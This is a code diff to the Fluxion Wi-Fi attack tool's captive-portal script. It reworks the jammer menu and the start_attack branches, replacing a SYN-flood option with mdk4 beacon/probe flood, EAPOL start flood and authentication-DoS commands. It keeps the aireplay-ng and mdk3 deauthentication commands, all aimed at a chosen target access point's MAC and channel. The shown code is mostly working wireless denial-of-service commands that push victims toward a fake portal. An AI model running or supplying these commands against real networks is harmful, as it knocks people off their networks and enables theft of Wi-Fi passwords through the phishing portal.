@@ -152,10 +152,11 @@ function captive_portal_set_ap_service() {
 fluxion_header
 
 echo -e "$FLUXIONVLine ${CClr}Select a method of deauthentication\n${CClr}"
-echo -e "${CSRed}[${CSYel}1${CSRed}]${CClr} mdk4${CClr}"
-echo -e "${CSRed}[${CSYel}2${CSRed}]${CClr} aireplay${CClr}"
-echo -e "${CSRed}[${CSYel}3${CSRed}]${CClr} mdk3${CClr}"
-echo -e "${CSRed}[${CSYel}4${CSRed}]${CClr} SYN Flood\n${CClr}"
+echo -e "${CSRed}[${CSYel}1${CSRed}]${CClr} mdk4 (Beacon/Probe Flood)${CClr}"
+echo -e "${CSRed}[${CSYel}2${CSRed}]${CClr} aireplay (Deauth)${CClr}"
+echo -e "${CSRed}[${CSYel}3${CSRed}]${CClr} mdk3 (Deauth)${CClr}"
+echo -e "${CSRed}[${CSYel}4${CSRed}]${CClr} mdk4 (EAPOL Start Flood)${CClr}"
+echo -e "${CSRed}[${CSYel}5${CSRed}]${CClr} mdk4 (Authentication DoS)\n${CClr}"
 read -p $'\e[0;31m[\e[1;34mfluxion\e[1;33m@\e[1;37m'"$HOSTNAME"$'\e[0;31m]\e[0;31m-\e[0;31m[\e[1;33m~\e[0;31m] \e[0m' option_deauth
 
 
@@ -1505,14 +1506,14 @@ start_attack() {
   elif [[ $option_deauth -eq 1 ]]; then
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
-        -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
-        "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\"" &
+        -title "FLUXION AP Jammer Service (mdk4 Beacon/Probe) [$FluxionTargetSSID]" -e \
+        "mdk4 $CaptivePortalJammerInterface b -c $FluxionTargetChannel -a \"$FluxionTargetMAC\"" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
   elif [[ $option_deauth -eq 2 ]]; then
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
-        -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
+        -title "FLUXION AP Jammer Service (aireplay) [$FluxionTargetSSID]" -e \
         "aireplay-ng -0 0 -a $FluxionTargetMAC --ignore-negative-one $CaptivePortalJammerInterface" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
@@ -1520,15 +1521,22 @@ start_attack() {
   elif [[ $option_deauth -eq 3 ]]; then
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
-        -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
+        -title "FLUXION AP Jammer Service (mdk3) [$FluxionTargetSSID]" -e \
         "mdk3 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\"" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
   elif [[ $option_deauth -eq 4 ]]; then
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
-        -title "FLUXION AP Jammer Service (SYN Flood) [$FluxionTargetSSID]" -e \
-        "python \"$FLUXIONPath/attacks/Captive Portal/syn-flood.py\" -a $FluxionTargetMAC -c $FluxionTargetChannel" &
+        -title "FLUXION AP Jammer Service (mdk4 EAPOL) [$FluxionTargetSSID]" -e \
+        "mdk4 $CaptivePortalJammerInterface e -t $FluxionTargetMAC -c $FluxionTargetChannel" &
+        # Save parent's pid, to get to child later.
+    	CaptivePortalJammerServiceXtermPID=$!
+  elif [[ $option_deauth -eq 5 ]]; then
+
+	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
+        -title "FLUXION AP Jammer Service (mdk4 Auth DoS) [$FluxionTargetSSID]" -e \
+        "mdk4 $CaptivePortalJammerInterface a -a $FluxionTargetMAC -c $FluxionTargetChannel" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
   fi
